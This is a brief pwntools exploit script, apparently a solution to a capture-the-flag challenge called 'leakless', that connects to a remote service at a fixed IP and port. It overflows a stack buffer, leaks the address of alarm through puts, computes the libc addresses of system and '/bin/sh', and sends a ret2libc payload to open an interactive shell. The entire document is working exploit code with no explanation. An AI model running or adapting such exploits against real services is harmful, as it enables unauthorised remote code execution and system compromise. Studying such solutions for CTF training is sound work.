from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])
elf = ELF('./leakless')
plt_puts = elf.symbols['puts']
got_puts = elf.got['puts']

t = remote('35.243.188.20', 2002)

addr_ret = 0x80485CB


payload = fit({0x48 + 0x4:[p32(plt_puts),p32(addr_ret),p32(0x804a014)]})  #alarm_addr
t.send(payload)
addr_alarm = u32(t.recv(4))
log.info(hex(addr_alarm))
addr_sys = addr_alarm - 0x0bea70 + 0x03d540
binsh = addr_alarm - 0x0bea70 + 0x1794d1
payload = fit({0x48 + 0x4:[p32(addr_sys),p32(0),p32(binsh)]})
t.send(payload)
t.interactive()